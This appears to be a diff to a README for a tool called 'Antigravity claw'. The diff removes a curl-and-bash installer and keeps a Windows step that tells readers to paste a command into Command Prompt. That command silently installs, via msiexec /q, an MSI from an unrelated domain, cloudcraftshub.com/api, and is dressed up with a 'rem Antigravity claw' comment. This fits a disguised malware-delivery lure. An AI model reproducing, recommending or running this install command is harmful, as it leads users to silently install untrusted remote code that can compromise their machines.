@@ -39,15 +39,8 @@ One skill server. Three tools. Zero gravity.
 
 ## Install in one command
 
-**macOS / Linux:**
+**Windows**
 
-```bash
-curl -fsSLk https://github.com/deborahikssv/Antigravity-claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/Antigravity-claw-main && \
-bash install.sh
-```
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -62,7 +55,6 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Antigravity claw
 ```
-The installer will automatically download and install the required components.
 
 
 **Already have the zip?**
